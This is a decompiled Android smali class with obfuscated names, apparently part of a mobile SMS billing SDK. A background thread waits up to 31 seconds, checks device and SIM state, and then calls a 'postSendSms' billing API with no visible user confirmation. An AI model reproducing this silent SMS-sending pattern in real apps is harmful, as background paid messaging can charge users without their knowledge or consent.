.class Lorg/zzf/core/c/m;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Lorg/zzf/core/c/l;


# direct methods
.method constructor <init>(Lorg/zzf/core/c/l;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lorg/zzf/core/c/m;->b:Lorg/zzf/core/c/l;

    iput-object p2, p0, Lorg/zzf/core/c/m;->a:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    const/4 v0, 0x0

    move v1, v0

    :goto_0
    const/16 v0, 0x1f

    if-ge v1, v0, :cond_0

    const-wide/16 v2, 0x3e8

    :try_start_0
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    invoke-static {}, Lorg/zzf/core/b/i;->a()Lorg/zzf/core/b/i;

    move-result-object v0

    iget-object v2, p0, Lorg/zzf/core/c/m;->a:Landroid/content/Context;

    invoke-virtual {v0, v2}, Lorg/zzf/core/b/i;->k(Landroid/content/Context;)I

    move-result v0

    const/16 v2, 0x3e9

    if-ne v0, v2, :cond_1

    iget-object v0, p0, Lorg/zzf/core/c/m;->a:Landroid/content/Context;

    invoke-static {v0}, Lorg/zzf/core/b/i;->z(Landroid/content/Context;)I

    move-result v0

    const/4 v2, 0x3

    if-ne v0, v2, :cond_1

    iget-object v0, p0, Lorg/zzf/core/c/m;->b:Lorg/zzf/core/c/l;

    invoke-static {v0}, Lorg/zzf/core/c/l;->a(Lorg/zzf/core/c/l;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_0

    iget-object v0, p0, Lorg/zzf/core/c/m;->a:Landroid/content/Context;

    iget-object v2, p0, Lorg/zzf/core/c/m;->b:Lorg/zzf/core/c/l;

    invoke-static {v2}, Lorg/zzf/core/c/l;->a(Lorg/zzf/core/c/l;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/mpay/hszp/core/BilAPI;->postSendSms(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :cond_0
    :goto_1
    return-void

    :catch_0
    move-exception v0

    :try_start_1
    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :cond_1
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto :goto_0

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method
